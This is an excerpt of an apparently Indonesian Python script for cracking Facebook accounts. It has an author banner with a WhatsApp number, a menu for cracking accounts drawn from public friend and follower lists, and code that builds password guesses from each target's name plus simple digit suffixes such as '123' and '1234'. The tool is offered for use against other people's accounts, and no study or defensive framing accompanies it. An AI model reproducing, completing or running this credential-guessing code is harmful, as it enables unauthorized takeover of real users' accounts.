...
AUTHOR FRAN JASON SEBAYANG!

\033[92;1m----------------------------------------------------------
\033[97;1m╔[ \033[92;1mCreator  \033[97;1m: \033[93;1mFRAN JASON. \033[97;1mAnd [\033[92;1mQueen's -DUMAY\033[97;1m]
\033[97;1m╠[ \033[92;1mWhatsApp \033[97;1m: \033[93;1m+6281363076900
\033[97;1m╠[ \033[92;1mGithub   \033[97;1m: \033[93;1mHttps://github.com/Private
\033[97;1m╠[ \033[92;1mNickname \033[97;1m: \033[93;1mM.R.X \033[97;1m[\033[92;1mFollow Me Facebook\033[97;1m]
\033[92;1m----------------------------------------------------------
""")
...
def menu():
	...
	print(u+line)
	print(s+"\n{"+m+"1"+s+"}"+l+" Crack Dari Pertemanan Atau Publik "+m+"{ERROR}")
	print(s+"{"+m+"2"+s+"}"+l+" Crack Dari Followers Publik "+h+"{5000}")
	print(s+"{"+m+"3"+s+"}"+l+" Crack Pertemanan Publik "+s+"{"+m+"ERROR"+s+"}")
	print(s+"{"+m+"4"+s+"}"+l+" Crack Akun Old 04/08 "+s+"{"+m+"ERROR"+s+"}")
	print(s+"{"+m+"5"+s+"}"+l+" Crack Akun Old 04/10 "+s+"{"+m+"ERROR"+s+"}")
                ...
                for yf in id:
                        ...
                        for xr in namee.split(" "):
                                if len(xr)<3:
                                        ...
                                        xr = xr.lower()
                                        if len(xr)==3 or len(xr)==4 or len(xr)==9:
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                                past.append(xr+"123456")
                                                past.append(xr+"1234567")
                                                past.append("12345678")
                                                past.append(xr+"123456789")
                                        else:
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
